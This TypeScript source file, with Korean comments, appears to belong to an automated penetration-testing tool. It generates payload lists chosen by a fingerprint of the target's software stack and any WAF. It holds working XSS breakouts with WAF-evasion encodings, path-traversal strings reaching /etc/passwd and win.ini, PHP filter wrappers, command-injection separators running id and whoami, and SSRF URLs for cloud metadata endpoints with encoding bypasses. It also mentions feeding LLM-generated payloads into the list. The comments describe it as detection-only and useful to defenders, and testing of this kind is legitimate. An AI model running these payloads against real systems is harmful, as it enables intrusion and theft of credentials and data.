/**
 * PayloadForge — 창의적 페이로드 생성기.
 *
 * "특정 방법 하나"가 아니라, 대상의 fingerprint(스택/OS/WAF)를 재료로 **여러 갈래의
 * 우회·변형 페이로드**를 발산적으로 만들어낸다. 인젝션 툴은 이 목록을 "탐지 오라클"로
 * 소진하며, 방어측은 "이런 다양한 변형까지 막아야 한다"는 것을 알 수 있다.
 *
 * 설계 원칙:
 *   - fp 인지: PHP 면 php:// 래퍼, Windows 면 win.ini/`dir`, MSSQL 이면 다른 SQL 구문…
 *   - WAF 인지: WAF 흔적이 보이면 인코딩/케이스/주석 삽입 등 우회 변형을 앞세운다.
 *   - 무해성: 실행 신호를 관찰할 최소 페이로드만(파괴/과다요청 금지).
 *   - 확장 지점: 실제 LLM 을 붙이면 이 함수 결과에 모델 생성 페이로드를 합류시킬 수 있다.
 */

import type { Fingerprint } from "../memory/skill-memory.js";

export type VulnClass = "xss" | "lfi" | "ssti" | "cmdi" | "ssrf" | "redirect";

/** fp 에서 스택/OS/WAF 성격을 뽑는다(문자열 신호 기반, 느슨한 매칭). */
export interface StackHint {
  php: boolean;
  windows: boolean;
  java: boolean;
  node: boolean;
  python: boolean;
  ruby: boolean;
  waf: boolean;
}

export function stackHint(fp: Fingerprint): StackHint {
  const hay = [fp.service ?? "", fp.version ?? "", fp.os ?? "", ...(fp.tech ?? []), ...(fp.indicators ?? [])]
    .join(" ")
    .toLowerCase();
  return {
    php: /php/.test(hay),
    windows: /windows|win32|iis|asp/.test(hay),
    java: /java|tomcat|jsp|spring|struts/.test(hay),
    node: /node|express|next\.js|nuxt/.test(hay),
    python: /python|django|flask|werkzeug|jinja/.test(hay),
    ruby: /ruby|rails|puma|rack/.test(hay),
    waf: /waf|cloudflare|akamai|mod_?security|incapsula|imperva|f5|big-?ip|sucuri|403 forbidden \(waf\)/.test(hay),
  };
}

/**
 * 주어진 취약점 부류에 대해 다양한 페이로드를 생성한다.
 * `mark` 는 반사/실행을 응답에서 식별하기 위한 토큰. 기본값 `{MARK}` 는 **플레이스홀더**로,
 * xss_probe 가 실행 시점의 고유 마커로 치환한다(플래너가 fp 로 만들어 args.payloads 로 넘겨도
 * 툴이 동일하게 치환·탐지할 수 있게 하는 규약).
 * 반환 배열은 "가능성 높은 것 → 우회 변형" 순으로 정렬되며 상한(cap)을 넘지 않는다.
 */
export function forge(vuln: VulnClass, fp: Fingerprint = {}, mark = "{MARK}", cap = 12): string[] {
  const h = stackHint(fp);
  let out: string[];
  switch (vuln) {
    case "xss":
      out = forgeXss(mark, h);
      break;
    case "lfi":
      out = forgeLfi(h);
      break;
    case "ssti":
      out = forgeSsti(h);
      break;
    case "cmdi":
      out = forgeCmdi(h);
      break;
    case "ssrf":
      out = forgeSsrf(h);
      break;
    case "redirect":
      out = forgeRedirect();
      break;
    default:
      out = [];
  }
  return dedupe(out).slice(0, cap);
}

/** XSS: 태그/속성/이벤트/프로토콜 문맥 + WAF 우회 변형. 모두 mark 를 포함해 오라클이 식별. */
function forgeXss(mark: string, h: StackHint): string[] {
  const base = [
    `"'><x-${mark}>`, // 태그/속성 breakout
    `<img src=x onerror="/*${mark}*/">`,
    `<svg/onload=/*${mark}*/>`,
    `"><script>/*${mark}*/</script>`,
    `'-/*${mark}*/-'`, // JS 문자열 문맥
    `javascript:/*${mark}*/`, // href 문맥
    `<x-${mark} a="`,
  ];
  if (h.waf) {
    // WAF 흔적 → 케이스 변형/인코딩/주석 삽입 등 우회를 앞세운다.
    return [
      `<sVg/OnLoad=/*${mark}*/>`,
      `<img src=x onerror=&#47;*${mark}*&#47;>`,
      `%3Cx-${mark}%3E`,
      `<x${"\u0000"}-${mark}>`,
      ...base,
    ];
  }
  return base;
}

/** LFI/경로조작: 다중 인코딩·깊이 + 스택별 래퍼(PHP)·OS별 파일(Windows). */
function forgeLfi(h: StackHint): string[] {
  const unix = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd", // 이중 인코딩(WAF 우회)
  ];
  const win = [
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
  ];
  const php = ["php://filter/convert.base64-encode/resource=index.php", "php://filter/resource=/etc/passwd"];
  const list = [...unix];
  if (h.windows) list.unshift(...win);
  if (h.php) list.push(...php);
  return list;
}

/** SSTI: 엔진별(Jinja/Twig/Freemarker/ERB/Velocity) 산술식. 응답에 49 가 나오면 신호. */
function forgeSsti(h: StackHint): string[] {
  const generic = ["${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "{7*7}", "@(7*7)"];
  const list = [...generic];
  if (h.python) list.unshift("{{7*'7'}}", "{{7*7}}"); // Jinja2: 7777777 / 49
  if (h.java) list.unshift("${7*7}", "#{7*7}"); // Freemarker/Spring EL
  if (h.ruby) list.unshift("<%= 7*7 %>"); // ERB
  return list;
}

/** OS 커맨드 인젝션: 구분자 다양화 + Windows/Unix. uid= 또는 호스트명 출력 신호. */
function forgeCmdi(h: StackHint): string[] {
  const unix = [";id", "|id", "||id", "&&id", "`id`", "$(id)", "%0aid", "; id #"];
  const win = ["|whoami", "&whoami", "&&whoami", "|ver"];
  return h.windows ? [...win, ...unix] : [...unix, ...win];
}

/** SSRF: 내부/메타데이터 + 우회 표기(십진 IP·[::]·@우회). */
function forgeSsrf(_h: StackHint): string[] {
  return [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0177.0.0.1/", // 8진 표기 우회
    "http://2130706433/", // 10진 IP 우회(127.0.0.1)
    "http://169.254.169.254.nip.io/", // DNS 리바인딩 계열
  ];
}

/** 오픈 리다이렉트: 스킴/프로토콜상대/@우회/백슬래시 등 파서 혼동 변형. */
function forgeRedirect(canary = "redcell-canary.example.net"): string[] {
  return [
    `https://${canary}/`,
    `//${canary}`,
    `https:/${canary}`,
    `https:${canary}`,
    `/\\${canary}`,
    `https://trusted.example.com@${canary}/`,
    `http://${canary}%2f..`,
  ];
}

function dedupe(xs: string[]): string[] {
  return [...new Set(xs)];
}
